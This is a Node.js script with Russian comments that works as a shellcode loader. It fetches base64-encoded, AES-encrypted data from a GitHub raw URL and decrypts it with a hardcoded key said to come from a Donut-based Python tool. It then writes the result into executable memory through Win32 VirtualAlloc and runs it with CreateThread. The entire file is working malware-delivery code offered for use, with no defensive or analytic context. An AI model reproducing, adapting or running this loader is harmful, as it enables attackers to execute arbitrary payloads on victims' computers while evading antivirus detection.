const https = require('https');
const koffi = require('koffi');
const crypto = require('crypto'); // Встроенный модуль для AES

const kernel32 = koffi.load('kernel32.dll');

// --- НАСТРОЙКИ ---
// Вставьте сюда Ключ (Hex), который выдал don.py
const HEX_KEY = '1b488f0c81dcb00414936069a22a23a79e99d213393c1a0984dec5a374817c1f'; 
const url = 'https://raw.githubusercontent.com/OmonR/repo2/refs/heads/main/data.txt';
// -----------------

// 1. Объявляем функции Win32 API
const VirtualAlloc = kernel32.func('void* VirtualAlloc(void* lpAddress, size_t dwSize, uint32_t flAllocationType, uint32_t flProtect)');
const RtlMoveMemory = kernel32.func('void RtlMoveMemory(void* Destination, const void* Source, size_t Length)');
const CreateThread = kernel32.func('void* CreateThread(void* lpThreadAttributes, size_t dwStackSize, void* lpStartAddress, void* lpParameter, uint32_t dwCreationFlags, uint32_t* lpThreadId)');
const WaitForSingleObject = kernel32.func('uint32_t WaitForSingleObject(void* hHandle, uint32_t dwMilliseconds)');

const MEM_COMMIT_RESERVE = 0x3000;
const PAGE_EXECUTE_READWRITE = 0x40;

https.get(url, (res) => {
    let rawData = '';
    res.on('data', (chunk) => rawData += chunk);
    res.on('end', () => {
        try {
            // Декодируем Base64
            const fullEncryptedData = Buffer.from(rawData.trim(), 'base64');
            console.log(`[+] Загружено зашифрованных данных: ${fullEncryptedData.length} байт`);

            // 2. Деобфускация (AES Decryption)
            
            // Извлекаем IV (первые 16 байт)
            const iv = fullEncryptedData.subarray(0, 16);
            // Извлекаем зашифрованное тело (остальное)
            const encryptedShellcode = fullEncryptedData.subarray(16);
            
            // Превращаем Hex-ключ в Buffer
            const key = Buffer.from(HEX_KEY, 'hex');

            // Расшифровываем
            const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
            // Важно: Donut шеллкод часто требует отключения авто-паддинга, если возникнут ошибки, 
            // но стандартный pad из Python обычно дружит с дефолтным unpad в Node.js
            const shellcode = Buffer.concat([decipher.update(encryptedShellcode), decipher.final()]);

            console.log(`[+] Деобфускация завершена. Чистый шеллкод: ${shellcode.length} байт`);

            // 3. Выделяем память
            const address = VirtualAlloc(null, shellcode.length, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);

            if (!address) {
                console.error("[-] Ошибка: VirtualAlloc вернул NULL.");
                return;
            }
            console.log("[+] Память выделена по адресу:", address);

            // 4. Копирование расшифрованного шеллкода
            RtlMoveMemory(address, shellcode, shellcode.length);
            console.log("[+] Шеллкод скопирован в память.");

            // 5. Запуск
            const thread = CreateThread(null, 0, address, null, 0, null);
            
            if (!thread) {
                console.error("[-] Ошибка CreateThread.");
                return;
            }

            console.log("[+] Поток запущен. Ожидание завершения...");
            WaitForSingleObject(thread, 0xFFFFFFFF);

        } catch (err) {
            console.error("[-] Ошибка при расшифровке или выполнении:", err.message);
        }
    });
});